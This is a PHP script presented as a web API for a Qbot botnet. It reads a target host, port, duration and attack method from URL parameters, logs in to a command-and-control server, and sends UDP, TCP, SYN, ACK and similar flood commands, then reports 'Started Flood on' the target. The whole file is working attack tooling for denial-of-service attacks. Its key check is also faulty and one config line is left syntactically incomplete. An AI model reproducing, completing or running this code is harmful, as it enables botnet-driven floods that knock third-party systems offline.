<?php
//Qbot PHP Script for APIS
//API Link: http://HTTPSERV/botnet.php?key=&host=[host]&port=[port]&time=[time]&method=[method]
set_time_limit(1);

$server = ""; //Net Connection IP
$conport = ; //CNC Port
$username = ""; //Net Username
$password = ""; //Net Password

$activekeys = array();

$key = $_GET['key'];
$method = $_GET['method'];
$target = $_GET['host'];
$port = $_GET['port'];
$time = $_GET['time'];

$myKEY = ""; //Make A Key

if(!$key == $myKEY) die("Error, invalid key!");

if($method == "STD"){$command = "! STDHEX $target $port $time";}
if($method == "UDP"){$command = "! UDP $target $port $time 32 0 10";}
if($method == "VSE"){$command = ". VSE $target $port $time";}
if($method == "TCP"){$command = ". TCP $target $port $time";}
if($method == "XMS"){$command = ". XMS $target $port $time";}
if($method == "ACK"){$command = ". ACK $target $port $time";}
if($method == "SYN"){$command = ". SYN $target $port $time";}


$sock = fsockopen($server, $conport, $errno, $errstr, 2);

if($key == ""){
    if($time <= 300){

        if(!$sock){
            echo "Couldn't Connect To CNC Server...";
        } else{
            print(fread($sock, 512)."\n");
            fwrite($sock, $username . "\n");
            echo "<br>";
            print(fread($sock, 512)."\n");
            fwrite($sock, $password . "\n");
            echo "<br>";
            if(fread($sock, 512)){
                print(fread($sock, 512)."\n");
            }

            fwrite($sock, $command . "\n");
            fclose($sock);
            echo "<br>";
            echo "> $command ";

            echo "<br>";
            echo "<br>";
            echo "<br>";
            echo "API By Powerd By iOnly69\n";
            echo "<br>";
            echo "Started Flood on $target\n";
            echo "<br>";
            echo "Using Port: $port!\n";
            echo "<br>";
            echo "For $time Second(s)!\n";
            echo "<br>";
            echo "Using Method: $method!\n";
            echo "<br>";

        }
    }elseif($time > 300 && isset($sock)){
        echo "Please put a time under 300 seconds";
    }

}
?>